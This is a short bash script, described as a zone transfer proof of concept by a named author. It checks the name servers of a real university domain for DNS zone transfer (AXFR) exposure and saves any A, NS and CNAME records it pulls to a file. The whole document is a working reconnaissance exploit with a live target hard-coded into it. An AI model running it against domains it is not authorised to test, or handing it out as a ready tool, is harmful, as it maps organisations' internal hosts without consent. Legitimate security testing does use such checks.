# Zone transer POC for a single site
# Author:wh1te @ Xidian University
# Date:2016.5.17

# Target domain
declare d=xaufe.edu.cn
# Output file
declare output_file=xaufe.txt

ns_str=`dig -t ns ${d} | grep -E --color 'IN.*NS.*[[:space:]]([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+\.' | awk  '{print $5}' | grep -Eo --color '([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+'`
for ns in $ns_str
do
	echo "[Info]:Name server:${ns}" | tee -a "${output_file}";
    str=`dig @${ns} ${d} axfr | grep -E --color 'IN[[:space:]]+A|IN[[:space:]]+NS|IN[[:space:]]+CNAME'`; 
    if [ -z "$str" ];then
    	str="No zone Transfer vulns.";
    fi
    echo "[Result]:$str" | tee -a "${output_file}";
done
